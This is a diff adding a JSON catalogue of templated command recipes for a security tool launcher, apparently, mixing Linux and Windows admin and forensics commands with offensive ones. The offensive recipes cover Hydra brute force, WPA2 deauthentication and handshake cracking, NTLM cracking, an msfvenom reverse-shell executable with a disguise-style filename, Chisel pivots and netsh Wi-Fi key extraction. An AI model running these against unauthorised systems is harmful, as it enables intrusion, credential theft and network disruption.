@@ -1,0 +1,1425 @@
+{
+  "linux": [
+    {
+      "id": "nmap",
+      "name": "Nmap Network Scanner",
+      "category": "Recon & Scanning",
+      "icon": "radar",
+      "desc": "Premier network exploration, host discovery, and vulnerability scanner.",
+      "recipes": [
+        {
+          "name": "Stealth SYN Port Scan",
+          "desc": "Scans common ports without completing the 3-way handshake (half-open scan).",
+          "template": "nmap -sS -T4 -p {{ports}} {{target}}",
+          "params": [
+            {
+              "key": "target",
+              "label": "Target IP or Subnet",
+              "default": "192.168.1.1",
+              "placeholder": "10.0.0.1 or 192.168.1.0/24"
+            },
+            {
+              "key": "ports",
+              "label": "Target Ports",
+              "default": "1-1000",
+              "placeholder": "80,443,8080 or 1-65535"
+            }
+          ]
+        },
+        {
+          "name": "Aggressive OS & Service Version Detection",
+          "desc": "Detects daemon versions, fingerprints underlying OS, runs default scripts, and performs traceroute.",
+          "template": "nmap -A -T4 -p {{ports}} {{target}}",
+          "params": [
+            {
+              "key": "target",
+              "label": "Target IP",
+              "default": "192.168.1.1",
+              "placeholder": "10.0.0.50"
+            },
+            {
+              "key": "ports",
+              "label": "Target Ports",
+              "default": "1-1024",
+              "placeholder": "21,22,80,443"
+            }
+          ]
+        },
+        {
+          "name": "Comprehensive Vulnerability Engine (NSE Vuln)",
+          "desc": "Executes vulnerability detection scripts against identified open service versions.",
+          "template": "nmap -sV --script=vuln -T4 {{target}}",
+          "params": [
+            {
+              "key": "target",
+              "label": "Target IP",
+              "default": "192.168.1.1",
+              "placeholder": "10.0.0.1"
+            }
+          ]
+        },
+        {
+          "name": "Subnet Live Host Discovery (Ping Sweep)",
+          "desc": "Sweeps local CIDR subnet using ARP/ICMP to find active machines without port scanning.",
+          "template": "nmap -sn -PR {{subnet}}",
+          "params": [
+            {
+              "key": "subnet",
+              "label": "Subnet CIDR",
+              "default": "192.168.1.0/24",
+              "placeholder": "10.0.0.0/24"
+            }
+          ]
+        },
+        {
+          "name": "Fast UDP Top Ports Audit",
+          "desc": "Probes common high-risk UDP daemons (DNS, DHCP, SNMP, NTP).",
+          "template": "nmap -sU --top-ports {{top_count}} -T4 {{target}}",
+          "params": [
+            {
+              "key": "target",
+              "label": "Target IP",
+              "default": "192.168.1.1",
+              "placeholder": "10.0.0.1"
+            },
+            {
+              "key": "top_count",
+              "label": "Top Ports Count",
+              "default": "50",
+              "placeholder": "20, 50, 100"
+            }
+          ]
+        },
+        {
+          "name": "SMB Share & Security Enum (SMB-Security-Mode)",
+          "desc": "Checks SMB signing status, dialects, and anonymous null session share access.",
+          "template": "nmap -p 445 --script smb-security-mode,smb-enum-shares -T4 {{target}}",
+          "params": [
+            {
+              "key": "target",
+              "label": "Target Host or IP",
+              "default": "192.168.1.50",
+              "placeholder": "10.0.0.1"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "kismet",
+      "name": "Kismet Wireless Sniffer",
+      "category": "Wireless & RF",
+      "icon": "wifi",
+      "desc": "Wireless network detector, sniffer, and intrusion detection system for 802.11 and SDR.",
+      "recipes": [
+        {
+          "name": "Launch Kismet on Monitor Interface",
+          "desc": "Starts Kismet capturing on a designated wireless monitor card with local web UI.",
+          "template": "kismet -c {{interface}}",
+          "params": [
+            {
+              "key": "interface",
+              "label": "Capture Interface",
+              "default": "wlan0mon",
+              "placeholder": "wlan0, wlan0mon"
+            }
+          ]
+        },
+        {
+          "name": "Headless Logging with Fixed Channel",
+          "desc": "Locks capture interface to a single channel and logs packets to a dedicated directory.",
+          "template": "kismet -c {{interface}}:channel={{channel}} --daemonize -t {{log_title}}",
+          "params": [
+            {
+              "key": "interface",
+              "label": "Interface",
+              "default": "wlan0mon",
+              "placeholder": "wlan0mon"
+            },
+            {
+              "key": "channel",
+              "label": "Wi-Fi Channel",
+              "default": "6",
+              "placeholder": "1, 6, 11"
+            },
+            {
+              "key": "log_title",
+              "label": "Log File Prefix",
+              "default": "TacticalCapture",
+              "placeholder": "Campus_Scan"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "aircrack",
+      "name": "Aircrack-ng Suite",
+      "category": "Wireless & RF",
+      "icon": "radio",
+      "desc": "Complete suite for 802.11 wireless security auditing, monitoring, and WPA2 handshake cracking.",
+      "recipes": [
+        {
+          "name": "Enable Monitor Mode (airmon-ng)",
+          "desc": "Kills conflicting network daemons and shifts physical wireless adapter into monitor mode.",
+          "template": "airmon-ng check kill && airmon-ng start {{interface}}",
+          "params": [
+            {
+              "key": "interface",
+              "label": "Wireless Interface",
+              "default": "wlan0",
+              "placeholder": "wlan0"
+            }
+          ]
+        },
+        {
+          "name": "Targeted Handshake Capture (airodump-ng)",
+          "desc": "Locks airodump-ng onto a specific target BSSID and channel to capture the 4-way WPA2 handshake.",
+          "template": "airodump-ng -c {{channel}} --bssid {{bssid}} -w {{output_prefix}} {{monitor_interface}}",
+          "params": [
+            {
+              "key": "channel",
+              "label": "Channel",
+              "default": "6",
+              "placeholder": "1-14"
+            },
+            {
+              "key": "bssid",
+              "label": "Target BSSID (MAC)",
+              "default": "AA:BB:CC:DD:EE:FF",
+              "placeholder": "00:11:22:33:44:55"
+            },
+            {
+              "key": "output_prefix",
+              "label": "PCAP Output Prefix",
+              "default": "handshake_capture",
+              "placeholder": "wpa_capture"
+            },
+            {
+              "key": "monitor_interface",
+              "label": "Monitor Interface",
+              "default": "wlan0mon",
+              "placeholder": "wlan0mon"
+            }
+          ]
+        },
+        {
+          "name": "Deauthentication Attack (aireplay-ng)",
+          "desc": "Sends targeted 802.11 deauth frames to force client re-association and capture handshake.",
+          "template": "aireplay-ng --deauth {{count}} -a {{bssid}} -c {{client_mac}} {{monitor_interface}}",
+          "params": [
+            {
+              "key": "count",
+              "label": "Deauth Frames",
+              "default": "5",
+              "placeholder": "5 or 10"
+            },
+            {
+              "key": "bssid",
+              "label": "Access Point BSSID",
+              "default": "AA:BB:CC:DD:EE:FF",
+              "placeholder": "AP MAC"
+            },
+            {
+              "key": "client_mac",
+              "label": "Client Station MAC",
+              "default": "11:22:33:44:55:66",
+              "placeholder": "Client MAC"
+            },
+            {
+              "key": "monitor_interface",
+              "label": "Monitor Interface",
+              "default": "wlan0mon",
+              "placeholder": "wlan0mon"
+            }
+          ]
+        },
+        {
+          "name": "Dictionary Handshake Crack (aircrack-ng)",
+          "desc": "Brute-forces the captured WPA2 4-way handshake using a wordlist dictionary.",
+          "template": "aircrack-ng -w {{wordlist}} -b {{bssid}} {{capture_file}}",
+          "params": [
+            {
+              "key": "wordlist",
+              "label": "Wordlist Path",
+              "default": "/usr/share/wordlists/rockyou.txt",
+              "placeholder": "/path/to/wordlist.txt"
+            },
+            {
+              "key": "bssid",
+              "label": "Target BSSID",
+              "default": "AA:BB:CC:DD:EE:FF",
+              "placeholder": "MAC Address"
+            },
+            {
+              "key": "capture_file",
+              "label": "Capture (.cap) File",
+              "default": "handshake_capture-01.cap",
+              "placeholder": "capture.cap"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "tshark",
+      "name": "Tshark & Wireshark CLI",
+      "category": "Packet Inspection",
+      "icon": "terminal",
+      "desc": "Terminal-based deep packet inspection and network protocol dissection engine.",
+      "recipes": [
+        {
+          "name": "Live HTTP Host & URI Sniffer",
+          "desc": "Inspects outbound HTTP GET/POST traffic in real-time, extracting domain and path.",
+          "template": "tshark -i {{interface}} -Y \"http.request\" -T fields -e ip.src -e http.host -e http.request.uri",
+          "params": [
+            {
+              "key": "interface",
+              "label": "Interface Name or Number",
+              "default": "eth0",
+              "placeholder": "eth0, any, 1"
+            }
+          ]
+        },
+        {
+          "name": "DNS Query Resolution Sniffer",
+          "desc": "Monitors all outbound DNS query names to identify domains, beaconing, or C2 tunnels.",
+          "template": "tshark -i {{interface}} -Y \"dns.flags.response == 0\" -T fields -e ip.src -e dns.qry.name",
+          "params": [
+            {
+              "key": "interface",
+              "label": "Interface",
+              "default": "eth0",
+              "placeholder": "eth0, any"
+            }
+          ]
+        },
+        {
+          "name": "Filter Existing PCAP for Specific IP",
+          "desc": "Extracts packets matching source or destination IP from a previously saved .pcap file.",
+          "template": "tshark -r {{pcap_file}} -Y \"ip.addr == {{target_ip}}\" -w {{output_pcap}}",
+          "params": [
+            {
+              "key": "pcap_file",
+              "label": "Input PCAP File",
+              "default": "capture.pcap",
+              "placeholder": "traffic.pcapng"
+            },
+            {
+              "key": "target_ip",
+              "label": "Target IP Filter",
+              "default": "192.168.1.100",
+              "placeholder": "10.0.0.5"
+            },
+            {
+              "key": "output_pcap",
+              "label": "Filtered Output PCAP",
+              "default": "filtered.pcap",
+              "placeholder": "target_traffic.pcap"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "hydra",
+      "name": "THC Hydra",
+      "category": "Password Cracking",
+      "icon": "key",
+      "desc": "Fast, parallelized network login brute-force tool supporting over 50 protocols.",
+      "recipes": [
+        {
+          "name": "SSH Parallel Brute Force",
+          "desc": "Attempts SSH login across a wordlist using multiple concurrent threads.",
+          "template": "hydra -l {{username}} -P {{wordlist}} -t {{threads}} ssh://{{target_ip}}",
+          "params": [
+            {
+              "key": "username",
+              "label": "Username",
+              "default": "root",
+              "placeholder": "admin, root, user"
+            },
+            {
+              "key": "wordlist",
+              "label": "Password Wordlist",
+              "default": "/usr/share/wordlists/rockyou.txt",
+              "placeholder": "passwords.txt"
+            },
+            {
+              "key": "threads",
+              "label": "Parallel Threads",
+              "default": "4",
+              "placeholder": "4, 8, 16"
+            },
+            {
+              "key": "target_ip",
+              "label": "Target Host/IP",
+              "default": "192.168.1.50",
+              "placeholder": "10.0.0.1"
+            }
+          ]
+        },
+        {
+          "name": "FTP Brute Force with User & Pass Lists",
+          "desc": "Tests combinations of users and passwords against an FTP daemon.",
+          "template": "hydra -L {{user_list}} -P {{pass_list}} -t 4 ftp://{{target_ip}}",
+          "params": [
+            {
+              "key": "user_list",
+              "label": "Users List",
+              "default": "users.txt",
+              "placeholder": "usernames.txt"
+            },
+            {
+              "key": "pass_list",
+              "label": "Passwords List",
+              "default": "/usr/share/wordlists/rockyou.txt",
+              "placeholder": "passwords.txt"
+            },
+            {
+              "key": "target_ip",
+              "label": "Target IP",
+              "default": "192.168.1.50",
+              "placeholder": "10.0.0.1"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "gobuster",
+      "name": "Gobuster Web Fuzzer",
+      "category": "Web & Exploitation",
+      "icon": "globe",
+      "desc": "High-speed URI and DNS directory/subdomain brute-forcing tool written in Go.",
+      "recipes": [
+        {
+          "name": "Web Directory & File Brute Force",
+          "desc": "Discovers hidden files, folders, and scripts on a web server.",
+          "template": "gobuster dir -u {{url}} -w {{wordlist}} -x {{extensions}} -t {{threads}}",
+          "params": [
+            {
+              "key": "url",
+              "label": "Target URL",
+              "default": "http://192.168.1.50",
+              "placeholder": "http://example.com"
+            },
+            {
+              "key": "wordlist",
+              "label": "Wordlist Path",
+              "default": "/usr/share/wordlists/dirb/common.txt",
+              "placeholder": "common.txt"
+            },
+            {
+              "key": "extensions",
+              "label": "Extensions to Probe",
+              "default": "php,html,txt,bak",
+              "placeholder": "php,aspx,json"
+            },
+            {
+              "key": "threads",
+              "label": "Threads",
+              "default": "20",
+              "placeholder": "10, 20, 50"
+            }
+          ]
+        },
+        {
+          "name": "DNS Subdomain Enumeration",
+          "desc": "Discovers active subdomains using dictionary lookup against a DNS server.",
+          "template": "gobuster dns -d {{domain}} -w {{wordlist}} -t 20",
+          "params": [
+            {
+              "key": "domain",
+              "label": "Target Domain",
+              "default": "example.com",
+              "placeholder": "target.local"
+            },
+            {
+              "key": "wordlist",
+              "label": "DNS Wordlist",
+              "default": "/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt",
+              "placeholder": "subdomains.txt"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "hashcat",
+      "name": "Hashcat GPU Cracker",
+      "category": "Password Cracking",
+      "icon": "cpu",
+      "desc": "Advanced GPU-accelerated hash recovery and password cracking engine.",
+      "recipes": [
+        {
+          "name": "NTLM Hash Cracking (Mode 1000)",
+          "desc": "Recovers plaintext Windows passwords from NTLM hashes using wordlist and rules.",
+          "template": "hashcat -m 1000 -a 0 {{hash_file}} {{wordlist}} -r /usr/share/hashcat/rules/best64.rule",
+          "params": [
+            {
+              "key": "hash_file",
+              "label": "Hashes File",
+              "default": "ntlm_hashes.txt",
+              "placeholder": "hashes.txt"
+            },
+            {
+              "key": "wordlist",
+              "label": "Wordlist Path",
+              "default": "/usr/share/wordlists/rockyou.txt",
+              "placeholder": "wordlist.txt"
+            }
+          ]
+        },
+        {
+          "name": "WPA/WPA2 Handshake Hashcat (Mode 22000)",
+          "desc": "Cracks modern PMKID / EAPOL handshakes converted into hashcat .hc22000 format.",
+          "template": "hashcat -m 22000 -a 0 {{hash_file}} {{wordlist}}",
+          "params": [
+            {
+              "key": "hash_file",
+              "label": "22000 Hash File",
+              "default": "capture.22000",
+              "placeholder": "target.22000"
+            },
+            {
+              "key": "wordlist",
+              "label": "Wordlist Path",
+              "default": "/usr/share/wordlists/rockyou.txt",
+              "placeholder": "wordlist.txt"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "metasploit",
+      "name": "Metasploit & Msfvenom",
+      "category": "Web & Exploitation",
+      "icon": "shield",
+      "desc": "Penetration testing framework and automated payload generation suite.",
+      "recipes": [
+        {
+          "name": "Generate Windows x64 Reverse Shell (Msfvenom)",
+          "desc": "Creates an obfuscated 64-bit Windows executable payload connecting back to listener.",
+          "template": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f exe -o {{output_exe}}",
+          "params": [
+            {
+              "key": "lhost",
+              "label": "Listening IP (Your IP)",
+              "default": "192.168.1.10",
+              "placeholder": "10.0.0.5"
+            },
+            {
+              "key": "lport",
+              "label": "Listening Port",
+              "default": "4444",
+              "placeholder": "4444, 8443"
+            },
+            {
+              "key": "output_exe",
+              "label": "Output Payload Name",
+              "default": "payload_x64.exe",
+              "placeholder": "update.exe"
+            }
+          ]
+        },
+        {
+          "name": "Quick Multi-Handler One-Liner (Msfconsole)",
+          "desc": "Spawns a background Meterpreter reverse TCP handler in Metasploit.",
+          "template": "msfconsole -q -x \"use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{lhost}}; set LPORT {{lport}}; run\"",
+          "params": [
+            {
+              "key": "lhost",
+              "label": "Listening IP",
+              "default": "0.0.0.0",
+              "placeholder": "0.0.0.0 or your IP"
+            },
+            {
+              "key": "lport",
+              "label": "Listening Port",
+              "default": "4444",
+              "placeholder": "4444"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "netcat",
+      "name": "Netcat & Socat",
+      "category": "Recon & Scanning",
+      "icon": "network",
+      "desc": "The Swiss Army knife of TCP/IP networking, socket inspection, and shell piping.",
+      "recipes": [
+        {
+          "name": "Simple TCP Port Listener",
+          "desc": "Binds a local port and prints raw incoming bytes to terminal stdout.",
+          "template": "nc -lvnp {{port}}",
+          "params": [
+            {
+              "key": "port",
+              "label": "Listen Port",
+              "default": "4444",
+              "placeholder": "80, 4444, 9001"
+            }
+          ]
+        },
+        {
+          "name": "Banner Grabbing on Target Port",
+          "desc": "Connects to remote daemon with timeout to extract service identification banner.",
+          "template": "nc -v -w 3 {{target_ip}} {{port}}",
+          "params": [
+            {
+              "key": "target_ip",
+              "label": "Target IP",
+              "default": "192.168.1.50",
+              "placeholder": "10.0.0.1"
+            },
+            {
+              "key": "port",
+              "label": "Target Port",
+              "default": "22",
+              "placeholder": "21, 22, 80"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "linux_admin",
+      "name": "Linux Admin & Host Defense",
+      "category": "System Admin & Networking",
+      "icon": "server",
+      "desc": "Core Linux utilities for system auditing, permissions, processes, and network sockets.",
+      "recipes": [
+        {
+          "name": "Audit SUID Binaries (Privilege Escalation)",
+          "desc": "Scans filesystem for root-owned executables with setuid bit set.",
+          "template": "find / -perm -4000 -user root -type f 2>/dev/null",
+          "params": []
+        },
+        {
+          "name": "Listening Endpoints with Owning PIDs (ss)",
+          "desc": "Lists active TCP and UDP listening sockets without DNS name resolution delay.",
+          "template": "ss -tulpn",
+          "params": []
+        },
+        {
+          "name": "Real-Time Auth Log Monitor (Failed SSH)",
+          "desc": "Follows auth.log and highlights failed authentication attempts.",
+          "template": "tail -f /var/log/auth.log | grep -i --color=always \"failed\"",
+          "params": []
+        },
+        {
+          "name": "Inspect Service Status and Recent Logs (systemctl)",
+          "desc": "Checks daemon health and displays last 30 log lines.",
+          "template": "systemctl status {{service_name}} -n 30 --no-pager",
+          "params": [
+            {
+              "key": "service_name",
+              "label": "Service Name",
+              "default": "ssh",
+              "placeholder": "nginx, docker, ssh"
+            }
+          ]
+        },
+        {
+          "name": "Find Files Modified in Last 24 Hours",
+          "desc": "Useful for incident response triage to find recently dropped or altered files.",
+          "template": "find {{directory}} -type f -mtime -1 -ls 2>/dev/null",
+          "params": [
+            {
+              "key": "directory",
+              "label": "Search Directory",
+              "default": "/etc",
+              "placeholder": "/etc, /var/www, /home"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "wireless_pmkid",
+      "name": "PMKID & Clientless WPA2 Attack",
+      "category": "Wireless & RF",
+      "icon": "key",
+      "desc": "Clientless WPA/WPA2 PMKID capturing suite using hcxdumptool and hcxpcapngtool.",
+      "recipes": [
+        {
+          "name": "Capture PMKID Hashes Headless (hcxdumptool)",
+          "desc": "Captures PMKID hashes directly from access points without requiring connected client stations.",
+          "template": "hcxdumptool -i {{interface}} -o {{output_pcapng}} --enable_status=1",
+          "params": [
+            {
+              "key": "interface",
+              "label": "Wireless Monitor Interface",
+              "default": "wlan0mon",
+              "placeholder": "wlan0mon"
+            },
+            {
+              "key": "output_pcapng",
+              "label": "Output PCAPNG Path",
+              "default": "pmkid_capture.pcapng",
+              "placeholder": "capture.pcapng"
+            }
+          ]
+        },
+        {
+          "name": "Convert PCAPNG to Hashcat 22000 Format",
+          "desc": "Extracts captured PMKID / EAPOL hashes into Hashcat mode 22000 format.",
+          "template": "hcxpcapngtool -o {{hashcat_output}} {{input_pcapng}}",
+          "params": [
+            {
+              "key": "input_pcapng",
+              "label": "Source PCAPNG",
+              "default": "pmkid_capture.pcapng",
+              "placeholder": "capture.pcapng"
+            },
+            {
+              "key": "hashcat_output",
+              "label": "Output Hashcat File",
+              "default": "hashes.22000",
+              "placeholder": "pmkid.22000"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "tunneling_pivoting",
+      "name": "Chisel & Socat Network Pivots",
+      "category": "System Admin & Networking",
+      "icon": "route",
+      "desc": "Fast TCP/UDP port forwarding, relay listeners, and HTTP-encapsulated reverse tunnels.",
+      "recipes": [
+        {
+          "name": "Socat TCP Port Redirection Relay",
+          "desc": "Listens on a local port and automatically forwards all incoming traffic to a remote host/port.",
+          "template": "socat TCP-LISTEN:{{listen_port}},fork,reuseaddr TCP:{{target_ip}}:{{target_port}}",
+          "params": [
+            {
+              "key": "listen_port",
+              "label": "Local Listen Port",
+              "default": "8080",
+              "placeholder": "8080"
+            },
+            {
+              "key": "target_ip",
+              "label": "Forward Target IP",
+              "default": "192.168.1.1",
+              "placeholder": "10.0.0.50"
+            },
+            {
+              "key": "target_port",
+              "label": "Forward Target Port",
+              "default": "80",
+              "placeholder": "80, 443"
+            }
+          ]
+        },
+        {
+          "name": "Chisel Reverse SOCKS5 Server",
+          "desc": "Starts a Chisel reverse tunnel server waiting for remote agent callback.",
+          "template": "chisel server -p {{server_port}} --reverse",
+          "params": [
+            {
+              "key": "server_port",
+              "label": "Server Port",
+              "default": "8000",
+              "placeholder": "8000, 8080"
+            }
+          ]
+        },
+        {
+          "name": "Chisel Reverse Client Connection",
+          "desc": "Connects back to Chisel server and opens an internal SOCKS5 proxy.",
+          "template": "chisel client {{server_ip}}:{{server_port}} R:socks",
+          "params": [
+            {
+              "key": "server_ip",
+              "label": "Chisel Server IP",
+              "default": "10.0.0.1",
+              "placeholder": "192.168.1.100"
+            },
+            {
+              "key": "server_port",
+              "label": "Chisel Server Port",
+              "default": "8000",
+              "placeholder": "8000"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "linux_privesc_audit",
+      "name": "Linux Privilege Escalation Hunter",
+      "category": "Recon & Scanning",
+      "icon": "shield-alert",
+      "desc": "Automated reconnaissance commands to discover misconfigurations, SUID binaries, and sudo rights.",
+      "recipes": [
+        {
+          "name": "Audit Current Sudo Capabilities (sudo -l)",
+          "desc": "Lists available commands the current user can execute with root or other user privileges.",
+          "template": "sudo -l",
+          "params": []
+        },
+        {
+          "name": "Search for Writable Files in /etc and /var",
+          "desc": "Finds configuration files that can be tampered with by unprivileged users.",
+          "template": "find /etc /var -writable -type f 2>/dev/null | grep -v '/proc/'",
+          "params": []
+        },
+        {
+          "name": "Audit Crontab and Scheduled Tasks",
+          "desc": "Inspects system crontabs, user cron jobs, and systemd timers for privilege escalation vectors.",
+          "template": "cat /etc/crontab /etc/cron.*/* 2>/dev/null | grep -v '^#'",
+          "params": []
+        },
+        {
+          "name": "Check Linux Kernel Release and Architecture",
+          "desc": "Dumps kernel version to quickly identify dirtycow, overlayfs, or pwnkit vulnerabilities.",
+          "template": "uname -a && cat /etc/os-release | head -n 4",
+          "params": []
+        }
+      ]
+    },
+    {
+      "id": "linux_log_hunting",
+      "name": "Linux Incident Response & Forensics",
+      "category": "Packet Inspection",
+      "icon": "terminal",
+      "desc": "Triage commands for active user sessions, failed SSH attempts, and recently dropped files.",
+      "recipes": [
+        {
+          "name": "Real-Time SSH Auth Failures (tail journalctl)",
+          "desc": "Streams real-time SSH brute force and failed login attempts with colored output.",
+          "template": "journalctl -u ssh -f --no-pager | grep -i --color=always 'Failed password'",
+          "params": []
+        },
+        {
+          "name": "Audit Active User Sessions and Last Logins",
+          "desc": "Displays who is currently logged into the system along with recent user login history.",
+          "template": "w && echo '--- RECENT LOGINS ---' && last -n 10",
+          "params": []
+        },
+        {
+          "name": "Find SUID Executables Outside Standard System Paths",
+          "desc": "Flags anomalous SUID binaries placed in non-standard directories like /tmp, /dev/shm, or /opt.",
+          "template": "find / -perm -4000 -not -path '/usr/*' -not -path '/bin/*' 2>/dev/null",
+          "params": []
+        },
+        {
+          "name": "Audit Open Network Files Correlated to Sockets (lsof)",
+          "desc": "Reveals which specific process binary and user owns each open internet socket.",
+          "template": "lsof -i -P -n",
+          "params": []
+        }
+      ]
+    },
+    {
+      "id": "wifi_deauth_jam",
+      "name": "Wireless Deauthentication & Rogue AP Audit",
+      "category": "Wireless & RF",
+      "icon": "radio",
+      "desc": "Targeted 802.11 management frame transmission and broadcast beacon inspection.",
+      "recipes": [
+        {
+          "name": "Continuous Broadcast Deauth Burst (aireplay-ng)",
+          "desc": "Sends continuous 802.11 deauth frames to an access point BSSID to test client reconnection behavior.",
+          "template": "aireplay-ng --deauth {{count}} -a {{bssid}} {{interface}}",
+          "params": [
+            {
+              "key": "count",
+              "label": "Burst Count",
+              "default": "10",
+              "placeholder": "10, 50, 0 for infinite"
+            },
+            {
+              "key": "bssid",
+              "label": "Target BSSID (MAC)",
+              "default": "AA:BB:CC:DD:EE:FF",
+              "placeholder": "BSSID"
+            },
+            {
+              "key": "interface",
+              "label": "Monitor Interface",
+              "default": "wlan0mon",
+              "placeholder": "wlan0mon"
+            }
+          ]
+        },
+        {
+          "name": "Airodump Channel Hop Survey",
+          "desc": "Performs wide-spectrum passive 2.4 GHz beacon and client discovery.",
+          "template": "airodump-ng --band a --band bg {{interface}}",
+          "params": [
+            {
+              "key": "interface",
+              "label": "Monitor Interface",
+              "default": "wlan0mon",
+              "placeholder": "wlan0mon"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "windows": [
+    {
+      "id": "winget",
+      "name": "Windows Package Manager (winget)",
+      "category": "System Admin & Software",
+      "icon": "download",
+      "desc": "Native command-line package manager for automated Windows software management.",
+      "recipes": [
+        {
+          "name": "Search for Application by Name",
+          "desc": "Searches the official Windows Package Manager repository for matching IDs.",
+          "template": "winget search {{app_name}}",
+          "params": [
+            {
+              "key": "app_name",
+              "label": "Application Name",
+              "default": "Wireshark",
+              "placeholder": "Nmap, VSCode, Git"
+            }
+          ]
+        },
+        {
+          "name": "Silent Install by Exact Package ID",
+          "desc": "Installs an application silently, accepting all licenses without GUI prompts.",
+          "template": "winget install --id {{package_id}} -e --silent --accept-package-agreements --accept-source-agreements",
+          "params": [
+            {
+              "key": "package_id",
+              "label": "Exact Package ID",
+              "default": "WiresharkFoundation.Wireshark",
+              "placeholder": "Insecure.Nmap"
+            }
+          ]
+        },
+        {
+          "name": "Upgrade All Installed Applications Silently",
+          "desc": "Scans installed applications and triggers automated silent upgrades for all outdated packages.",
+          "template": "winget upgrade --all --silent --accept-package-agreements --accept-source-agreements",
+          "params": []
+        },
+        {
+          "name": "Export Installed Machine Software Manifest",
+          "desc": "Generates a JSON manifest of all installed software for disaster recovery / fleet cloning.",
+          "template": "winget export -o {{output_file}} --include-versions",
+          "params": [
+            {
+              "key": "output_file",
+              "label": "Output JSON Path",
+              "default": "C:\\Users\\daddy\\Desktop\\InstalledApps.json",
+              "placeholder": "apps.json"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "powershell_dfir",
+      "name": "PowerShell DFIR & Event Auditing",
+      "category": "DFIR & Forensics",
+      "icon": "shield-alert",
+      "desc": "High-fidelity Windows event log hunting and forensic triage cmdlets.",
+      "recipes": [
+        {
+          "name": "Audit Failed Logons (Security Event 4625)",
+          "desc": "Extracts failed authentication attempts with timestamps and account names.",
+          "template": "Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625} -MaxEvents {{max_events}} | Format-Table TimeCreated, Message -Wrap",
+          "params": [
+            {
+              "key": "max_events",
+              "label": "Max Events",
+              "default": "25",
+              "placeholder": "25, 50, 100"
+            }
+          ]
+        },
+        {
+          "name": "Audit Interactive Logons (Security Event 4624)",
+          "desc": "Surfaces successful console and RDP interactive sessions.",
+          "template": "Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents {{max_events}} | Where-Object {$_.Properties[8].Value -in @(2,10)} | Format-Table TimeCreated, Id, Message -Wrap",
+          "params": [
+            {
+              "key": "max_events",
+              "label": "Max Events",
+              "default": "25",
+              "placeholder": "25, 50"
+            }
+          ]
+        },
+        {
+          "name": "Audit Defender Antivirus Exclusions (Defense Evasion)",
+          "desc": "Checks Windows Defender configurations for suspicious exclusion paths or extensions.",
+          "template": "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath",
+          "params": []
+        },
+        {
+          "name": "Audit Process Creation Lineage (Sysmon / Event 4688)",
+          "desc": "Extracts process creation events including parent PIDs and full command-line arguments.",
+          "template": "Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} -MaxEvents {{max_events}} | Select-Object TimeCreated, @{N='Process';E={$_.Properties[5].Value}}, @{N='CommandLine';E={$_.Properties[8].Value}} | Format-Table -Wrap",
+          "params": [
+            {
+              "key": "max_events",
+              "label": "Max Events",
+              "default": "20",
+              "placeholder": "20, 50"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "powershell_net",
+      "name": "PowerShell Network & Sockets",
+      "category": "System Admin & Networking",
+      "icon": "network",
+      "desc": "Windows network stack inspection, active sockets, and remote connectivity testing.",
+      "recipes": [
+        {
+          "name": "Established TCP Sockets with Process Names",
+          "desc": "Correlates active network sockets directly to local executable names.",
+          "template": "Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess, @{N='Process';E={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}} | Format-Table -AutoSize",
+          "params": []
+        },
+        {
+          "name": "Test Remote TCP Port Connectivity (Test-NetConnection)",
+          "desc": "Tests whether a specific TCP port is reachable through firewall rules without ping.",
+          "template": "Test-NetConnection -ComputerName {{target_host}} -Port {{target_port}}",
+          "params": [
+            {
+              "key": "target_host",
+              "label": "Target Host or IP",
+              "default": "192.168.1.1",
+              "placeholder": "8.8.8.8"
+            },
+            {
+              "key": "target_port",
+              "label": "Target Port",
+              "default": "443",
+              "placeholder": "80, 443, 3389"
+            }
+          ]
+        },
+        {
+          "name": "Flush DNS Resolver Cache & Register",
+          "desc": "Clears local DNS client cache and re-registers client name with DNS servers.",
+          "template": "Clear-DnsClientCache; Register-DnsClient",
+          "params": []
+        },
+        {
+          "name": "Complete Network Adapter & DNS IP Configuration",
+          "desc": "Dumps full IPv4/IPv6, default gateways, and DNS server addresses across all connected interfaces.",
+          "template": "Get-NetIPConfiguration | Format-Table InterfaceAlias, IPv4Address, IPv4DefaultGateway, DNSServer -AutoSize",
+          "params": []
+        },
+        {
+          "name": "Continuous Latency & Jitter Monitor (Test-Connection)",
+          "desc": "Sends continuous ICMP probes to target host with exact millisecond latency timestamps.",
+          "template": "Test-Connection -TargetName {{target}} -Repeat",
+          "params": [
+            {
+              "key": "target",
+              "label": "Target IP or Hostname",
+              "default": "1.1.1.1",
+              "placeholder": "8.8.8.8"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "netsh",
+      "name": "Netsh Network Shell",
+      "category": "System Admin & Networking",
+      "icon": "wifi",
+      "desc": "Command-line scripting utility to display or modify the network configuration of a Windows host.",
+      "recipes": [
+        {
+          "name": "Extract Saved Wi-Fi Password (Cleartext Key)",
+          "desc": "Recovers cleartext WPA2/WPA3 pre-shared key for a saved Wi-Fi profile.",
+          "template": "netsh wlan show profile name=\"{{ssid}}\" key=clear",
+          "params": [
+            {
+              "key": "ssid",
+              "label": "Wi-Fi SSID Name",
+              "default": "MyHomeNetwork",
+              "placeholder": "Home_WiFi"
+            }
